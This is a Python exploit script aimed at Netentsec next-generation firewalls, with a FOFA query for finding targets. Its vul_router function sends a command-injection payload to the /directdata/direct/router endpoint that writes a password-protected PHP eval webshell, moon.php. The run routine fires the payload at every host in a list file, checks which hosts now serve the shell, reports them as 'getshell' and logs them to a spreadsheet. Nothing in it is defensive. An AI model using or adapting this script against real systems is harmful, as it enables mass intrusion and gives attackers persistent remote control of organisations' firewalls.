

import requests
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def help():
    print('''
    fofa: app="网康科技-下一代防火墙"
        1. 网康科技-下一代防火墙 router利用, 批量上传webshell, 密码p@assW0rd, 支持蚂剑
    x. 退出
    ''')

def vul_router(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Upgrade-Insecure-Requests': '1'
    }
    body = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;' \
              'echo "<?php @eval($_POST["p@assW0rd"]);?>" >/var/www/html/moon.php"]}],' \
              '"type":"rpc","tid":17,"f8839p7rqtj":"="}'
    method = "POST"
    path = "/directdata/direct/router"
    notes = ""
    return (url, method, headers, body, path, notes)

def run():
    OUTDIR = "result/网康科技-下一代防火墙"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    try:
        num = int(input("执行的指令: "))
    except ValueError:
        num = 99999
    if num == 1:
        data = []
        for url in li:
            item = vul_router(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            try:
                response = v[-1]
                if v[1] != 0:
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                    }
                    url = v[0] + '/moon.php'
                    code = requests.get(url=url, headers=headers, verify=False, timeout=4).status_code
                    if code == 200:
                        print(f'[+] {url} -> getshell')
            except Exception as E:
                print(E)
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '提示', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}网康科技-下一代防火墙 文件上传.xlsx")

    else:
        print('bye....')




